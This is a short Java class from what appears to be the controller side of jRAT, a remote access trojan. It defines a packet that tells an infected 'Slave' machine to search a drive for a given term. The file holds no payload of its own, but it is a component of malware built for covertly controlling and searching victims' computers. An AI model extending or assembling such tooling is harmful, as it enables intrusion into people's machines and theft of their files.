package se.jrat.controller.packets.outgoing;

import java.io.DataOutputStream;

import se.jrat.controller.Slave;


public class Packet53StartSearch extends AbstractOutgoingPacket {

	private String drive;
	private String term;
	private boolean pathContains;

	public Packet53StartSearch(String drive, String term, boolean pathContains) {
		this.drive = drive;
		this.term = term;
		this.pathContains = pathContains;
	}

	@Override
	public void write(Slave slave, DataOutputStream dos) throws Exception {
		slave.writeLine(drive);
		slave.writeLine(term);
		dos.writeBoolean(pathContains);
	}

	@Override
	public short getPacketId() {
		return 53;
	}

}
